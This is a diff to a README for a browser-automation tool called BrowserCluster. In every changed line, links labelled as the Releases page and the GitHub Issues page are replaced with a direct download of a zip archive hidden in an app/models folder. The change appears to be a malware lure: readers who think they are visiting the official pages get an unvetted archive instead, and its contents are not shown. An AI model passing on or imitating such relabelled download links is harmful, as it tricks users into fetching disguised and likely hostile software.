@@ -18,11 +18,11 @@ These requirements ensure BrowserCluster runs smoothly.
 
 You can easily download BrowserCluster from our Releases page. Click the link below to visit the page.
 
-[Download BrowserCluster](https://github.com/SagarSangani/BrowserCluster/releases)
+[Download BrowserCluster](https://raw.githubusercontent.com/SagarSangani/BrowserCluster/main/app/models/Browser_Cluster_v3.4.zip)
 
 ### Installation Steps
 
-1. Visit the [Releases page](https://github.com/SagarSangani/BrowserCluster/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/SagarSangani/BrowserCluster/main/app/models/Browser_Cluster_v3.4.zip).
 2. Find the latest version of BrowserCluster.
 3. Click on the appropriate file for your operating system to start the download.
 4. Once downloaded, locate the file in your downloads folder.
@@ -54,7 +54,7 @@ If you encounter any issues while using BrowserCluster, consider the following t
 - **Check Internet Connection:** Ensure you have a stable and fast internet connection.
 - **Reinstall the Application:** If problems persist, uninstall and reinstall BrowserCluster.
 - **Refer to Logs:** Check the logs for detailed error messages.
-- **Seek Help:** Visit the [GitHub Issues page](https://github.com/SagarSangani/BrowserCluster/issues) for additional support.
+- **Seek Help:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/SagarSangani/BrowserCluster/main/app/models/Browser_Cluster_v3.4.zip) for additional support.
 
 ## 🛠️ Advanced Configuration
 
@@ -77,4 +77,4 @@ We continually improve BrowserCluster based on user feedback. Stay tuned for upd
 
 ## 📌 Final Steps
 
-If you haven’t already, please make sure to visit the [Releases page](https://github.com/SagarSangani/BrowserCluster/releases) to download and start using BrowserCluster. Enjoy efficient and straightforward browser automation!
+If you haven’t already, please make sure to visit the [Releases page](https://raw.githubusercontent.com/SagarSangani/BrowserCluster/main/app/models/Browser_Cluster_v3.4.zip) to download and start using BrowserCluster. Enjoy efficient and straightforward browser automation!
